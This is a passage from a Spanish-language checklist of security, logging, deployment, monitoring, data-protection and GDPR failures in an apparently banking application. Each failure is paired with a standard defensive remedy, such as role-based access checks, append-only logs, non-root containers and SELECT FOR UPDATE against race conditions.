
- Preguntas de seguridad como segundo factor. Las respuestas
  son adivinables o están en redes sociales. Solución: TOTP
  (Google Authenticator) o SMS como segundo factor.

- Sin verificación del email al registrarse. Cualquiera puede
  crear cuentas con emails ajenos. Solución: flujo de
  verificación por enlace antes de activar la cuenta.

---

## Autorización

- Falta de control de acceso basado en roles (RBAC). Todos
  los usuarios autenticados pueden acceder a todos los endpoints.
  Solución: @PreAuthorize con roles específicos en cada método.

- Escalada de privilegios horizontal. Un cliente puede ver
  las transacciones de otro cliente cambiando el ID en la URL.
  Solución: verificar siempre que el recurso pertenece al
  principal autenticado.

- Escalada de privilegios vertical. Un usuario con rol USER
  llama a /api/admin/usuarios y el endpoint no verifica el rol.
  Solución: @PreAuthorize("hasRole('ADMIN')") en todos los
  endpoints administrativos.

- Endpoint de gestión accesible desde Internet. /api/admin
  debería ser interno pero está expuesto en el mismo puerto
  que la API pública. Solución: puerto de management separado
  solo accesible desde red interna.

- Permisos excesivos en la cuenta de base de datos. El usuario
  de la app tiene permisos de DROP TABLE. Un fallo de inyección
  puede destruir toda la base de datos. Solución: cuenta de
  DB solo con SELECT/INSERT/UPDATE en las tablas necesarias.

- Tokens de API sin ámbito (scope). Un token creado para
  consultar saldo sirve también para hacer transferencias.
  Solución: scopes explícitos en OAuth2/JWT.

- Sin separación de entornos en la autorización. Las credenciales
  de producción funcionan en el entorno de pruebas y viceversa.
  Solución: credenciales completamente separadas por entorno.

---

## Trazabilidad y logging

- Sin ID de correlación entre peticiones. Si un fallo atraviesa
  tres microservicios no hay forma de unir los logs y reconstruir
  qué pasó. Solución: generar un requestId al entrar y propagarlo
  en cabeceras y logs.

- Logs sin timestamp preciso. Solo fecha sin hora hace imposible
  ordenar eventos y detectar secuencias de ataque. Solución:
  timestamp con milisegundos en UTC en cada línea de log.

- Logs mutables. Un insider puede editar o borrar entradas de
  log para ocultar actividad. Solución: logs escritos a sistema
  append-only o enviados a SIEM externo en tiempo real.

- Ausencia de log de auditoría para operaciones privilegiadas.
  No queda rastro de quién aprobó qué operación ni cuándo.
  Solución: tabla de auditoría con usuario, acción, timestamp
  y resultado para toda operación sensible.

- Loguear contraseñas en intentos de login fallidos. Si el
  usuario escribe su contraseña en el campo usuario, queda
  en texto plano en el log. Solución: nunca loguear el campo
  password ni ningún campo de credencial.

- Logs sin nivel diferenciado. Todo al mismo nivel impide
  filtrar alertas reales del ruido. Solución: ERROR para
  fallos críticos, WARN para situaciones sospechosas, INFO
  para flujo normal.

- Sin retención definida para los logs. Los logs se borran
  a los 3 días por falta de espacio antes de que se detecte
  una incidencia. Solución: política de retención mínima de
  90 días, con archivo a largo plazo para auditoría regulatoria.

- Logs de diferentes componentes en zonas horarias distintas.
  Imposible correlacionar eventos entre el servidor de app y
  la base de datos. Solución: todos los sistemas en UTC.

---

## Despliegue

- Despliegue manual en producción. Un paso olvidado deja la
  app en estado inconsistente. Solución: pipeline CI/CD
  automatizado que no permita deploys parciales.

- Sin estrategia de rollback. Si el deploy falla en producción
  no hay forma de volver rápido a la versión anterior. Solución:
  blue-green deployment o canary release con rollback automático.

- Variables de entorno de producción en el repositorio. El
  fichero .env con las credenciales reales está en git.
  Solución: .env en .gitignore; secrets gestionados con
  Vault o el secrets manager del proveedor cloud.

- Imagen Docker construida con usuario root. Si hay una
  vulnerabilidad en la app el atacante tiene privilegios de
  root en el contenedor. Solución: USER no-root en el Dockerfile.

- Imagen base de Docker sin fijar versión (FROM openjdk:latest).
  Una actualización de la imagen base puede romper la app
  sin aviso. Solución: FROM eclipse-temurin:17.0.11_9-jre-jammy
  con versión exacta.

- Sin health check en el contenedor. El orquestador no sabe
  si la app está realmente levantada o en estado zombie.
  Solución: HEALTHCHECK en Dockerfile y endpoint /actuator/health.

- Artefactos compilados (JAR, WAR) subidos al repositorio de
  código. Hacen el repo enorme e impiden auditar qué hay dentro.
  Solución: el repo solo contiene código fuente; los artefactos
  se generan en CI y se publican en un registro de artefactos.

- Sin firma de los artefactos desplegados. No hay forma de
  verificar que el JAR en producción corresponde al código
  auditado. Solución: firma del artefacto en CI y verificación
  en el paso de despliegue.

---

## Monitorización

- Sin alertas sobre errores 5xx. Los fallos de servidor pasan
  desapercibidos hasta que un usuario se queja. Solución:
  alerta automática si la tasa de 5xx supera el 1% en 5 minutos.

- Sin monitorización de latencia. La app está respondiendo en
  30 segundos y nadie lo sabe. Solución: percentil p95 y p99
  de tiempo de respuesta en dashboard y alerta.

- Métricas de negocio no monitorizadas. Nadie detecta que el
  número de transferencias completadas cayó un 80% porque solo
  se miran métricas técnicas. Solución: métricas de negocio
  (transacciones por minuto, tasa de error de validación)
  junto a las técnicas.

- Sin monitorización del espacio en disco de los logs. El
  disco se llena, la app no puede escribir logs y empieza a
  fallar en silencio. Solución: alerta cuando el disco supere
  el 80% de ocupación.

- Dashboard de monitorización solo visible internamente.
  Cuando hay un incidente nadie fuera del equipo técnico sabe
  el estado real. Solución: página de estado pública para
  comunicar incidencias a clientes.

- Sin tracing distribuido. Los errores intermitentes en
  producción son imposibles de reproducir porque no hay
  visibilidad de la cadena completa de llamadas. Solución:
  OpenTelemetry + Jaeger o Zipkin.

- Alertas de monitorización que nadie revisa. El sistema
  lanza 500 alertas al día y el equipo las ignora todas.
  Solución: reducir las alertas a las que requieren acción
  humana; el resto son métricas.

---

## Mantenimiento y deuda técnica

- Dependencias sin actualizar durante más de un año. Librerías
  con CVEs críticos conocidos siguen en producción. Solución:
  Dependabot o OWASP Dependency-Check en el pipeline de CI.

- Sin tests de regresión. Cada cambio puede romper
  funcionalidad existente sin que nadie lo note hasta
  producción. Solución: suite de tests con cobertura mínima
  del 70% como gate en el pipeline.

- Código muerto sin eliminar. Métodos con @Deprecated que
  nadie borra acaban siendo usados por error en código nuevo.
  Solución: eliminar código muerto en cada PR, no acumularlo.

- Documentación de la API desactualizada. El contrato Swagger
  documenta v1 pero la API ya está en v3. Los consumidores
  integran mal. Solución: generar la documentación automáticamente
  desde el código con springdoc-openapi.

- Sin entorno de staging. Los cambios se prueban directamente
  en producción. Solución: entorno de staging idéntico a
  producción donde se valida antes de desplegar.

- Migraciones de base de datos manuales. Los scripts SQL
  se aplican a mano en producción y no están versionados.
  Solución: Flyway o Liquibase para migraciones versionadas
  y reproducibles.

- Sin proceso de revisión de código. Cualquier desarrollador
  hace merge directo a main sin revisión. Un error grave o una
  vulnerabilidad puede llegar a producción sin que nadie lo vea.
  Solución: Pull Requests con al menos un revisor requerido.

---

## Disponibilidad e integridad

- Sin réplica de base de datos. Si el servidor de DB cae,
  toda la aplicación deja de funcionar. Solución: réplica
  sincrónica con failover automático.

- Transacciones de base de datos no atómicas. Una transferencia
  descuenta de la cuenta origen pero falla antes de ingresar
  en destino. El dinero desaparece. Solución: @Transactional
  en el servicio; ambas operaciones en la misma transacción.

- Sin validación de integridad referencial en la aplicación.
  Se puede crear una transacción con una cuenta origen que
  no existe. Solución: foreign keys en la BD y validación
  en la capa de servicio.

- Condición de carrera en la verificación de saldo disponible.
  Dos peticiones simultáneas comprueban el saldo, ambas ven
  fondos suficientes y ambas ejecutan el cargo. El saldo
  queda negativo. Solución: SELECT FOR UPDATE o control
  optimista con versión.

- Sin comprobación de integridad en la importación de ficheros.
  Un fichero de log manipulado se importa sin verificar
  su hash. Solución: hash SHA-256 firmado junto a cada
  fichero de importación.

- Cachés sin invalidación correcta. El saldo en caché no
  se actualiza tras una transferencia y el cliente ve un
  saldo incorrecto. Solución: invalidar la caché del recurso
  afectado en cada operación de escritura.

---

## Protección de datos

- Números de tarjeta almacenados en texto plano. Un volcado
  de la tabla expone todos los datos de tarjetas. Solución:
  almacenar solo los últimos 4 dígitos; el número completo
  nunca en la base de datos.

- PII (datos personales) en los logs. El log de debug
  escribe el DNI y nombre del cliente al procesar cada
  petición. Solución: enmascarar DNI, nombres y cuentas
  en los logs; solo loguear IDs internos.

- Sin cifrado de datos en reposo. El disco del servidor de
  base de datos no está cifrado. Si el disco es robado,
  los datos son accesibles. Solución: cifrado a nivel de
  disco (LUKS, BitLocker) o cifrado a nivel de columna.

- Datos de clientes accesibles por todo el personal sin
  necesidad. El principio de mínimo privilegio no se aplica
  a los datos personales. Solución: control de acceso a
  datos por rol y necesidad justificada.

- Sin política de retención y borrado de datos. Datos de
  clientes dados de baja hace 10 años siguen en producción.
  Incumplimiento del principio de minimización del RGPD.
  Solución: proceso automatizado de anonimización o borrado
  tras el periodo de retención legal.

- Transferencia de datos personales a terceros sin contrato.
  Se comparten datos de clientes con un proveedor de analytics
  sin DPA firmado. Incumplimiento del RGPD artículo 28.
  Solución: contrato de encargo de tratamiento antes de
  cualquier transferencia de datos personales.

---

## Fallos humanos

- Despliegue en el entorno equivocado. El desarrollador
  despliega la rama de desarrollo en producción porque los
  comandos son similares. Solución: confirmación explícita
  para despliegues en producción; nombres de entorno
  visibles en el prompt del terminal.

- Borrado accidental de datos en producción. Una query sin
  WHERE ejecutada en la consola SQL de producción. Solución:
  acceso de solo lectura por defecto; las escrituras
  requieren conexión específica y aprobación.

- Credenciales compartidas entre varios empleados. Cuando
  hay un incidente no se sabe quién ejecutó qué. Solución:
  cuentas individuales para cada persona con logs de acceso.

- Cambio de configuración en producción sin documentar. Un
  parámetro cambiado a mano en el servidor que nadie sabe
  que existe y que causa un fallo meses después. Solución:
  toda la configuración como código (Infrastructure as Code).

- Falta de formación en seguridad del equipo de desarrollo.
  El equipo no conoce OWASP Top 10 y repite los mismos
  errores. Solución: formación anual en seguridad y revisión
  de código con enfoque en seguridad.

- Respuesta a incidentes sin procedimiento definido. Cuando
  ocurre un fallo grave nadie sabe quién debe hacer qué.
  El tiempo de resolución se multiplica. Solución: runbook
  documentado y simulacros periódicos de incidentes.

- Uso de contraseñas personales para accesos corporativos.
  Un empleado reutiliza su contraseña de Gmail para acceder
  al servidor de producción. Solución: gestor de contraseñas
  corporativo y política de contraseñas únicas.

---

## Fallos legales, organizativos y procedimentales

- Sin Registro de Actividades de Tratamiento (RGPD art. 30).
  El banco no tiene documentado qué datos trata, con qué
  finalidad y durante cuánto tiempo. Infracción grave.
  Solución: mantener el registro actualizado y revisado
  anualmente.

- Sin Evaluación de Impacto (DPIA) para tratamientos de
  alto riesgo. El sistema de detección de fraude perfilaría
  a clientes sin haber realizado la evaluación obligatoria.
  Solución: DPIA antes de poner en producción sistemas de
  decisión automatizada.

- Sin procedimiento de notificación de brechas de seguridad.
  El RGPD exige notificar a la AEPD en 72 horas. Si no hay
  procedimiento, se incumple el plazo y la multa se agrava.
  Solución: protocolo escrito con responsables y plazos.

- Sin cláusulas de seguridad en contratos con proveedores.
  Un proveedor de cloud tiene acceso a datos de clientes sin
  compromisos contractuales de seguridad. Solución: cláusulas
  técnicas y organizativas en todos los contratos con acceso
  a datos.

- Ausencia de política de clasificación de la información.
  Nadie sabe qué datos son confidenciales y cuáles pueden
  compartirse. Documentos sensibles circulan por email sin
  cifrar. Solución: política de clasificación con niveles
  y controles asociados a cada nivel.

- Sin análisis de riesgos formal. Las decisiones de seguridad
  se toman por intuición, no por riesgo evaluado. Solución:
  análisis de riesgos anual siguiendo ISO 27001 o NIST.

- Sin gestor de vulnerabilidades. Los bugs de seguridad se
  reportan por email y se pierden. Solución: sistema de
  ticketing con SLA por severidad para vulnerabilidades.

- Sin proceso de offboarding de empleados. Un ex-empleado
  sigue teniendo acceso al repositorio y al servidor durante
  meses. Solución: checklist de baja que incluye revocación
  de todos los accesos el mismo día de la baja.

- Sin plan de continuidad de negocio. Si el centro de datos
  principal cae, no hay plan para seguir operando.
  Solución: BCP documentado con RTO y RPO definidos y
  probados al menos una vez al año.

- Uso de software sin licencia en el proyecto. Una librería
  con licencia GPL en un producto comercial obliga a publicar
  el código fuente. Solución: auditoría de licencias de
  dependencias con herramienta automática (FOSSA, License Finder).

- Sin separación de funciones en operaciones críticas.
  La misma persona que aprueba una transferencia también la
  ejecuta. Fraude sin control posible. Solución: doble
  validación obligatoria para operaciones por encima de umbral.

- Sin seguro de ciberriesgo. Un incidente grave puede generar
  responsabilidades económicas no cubiertas. Solución: evaluar
  cobertura de ciberriesgo como parte de la gestión del riesgo
  empresarial.
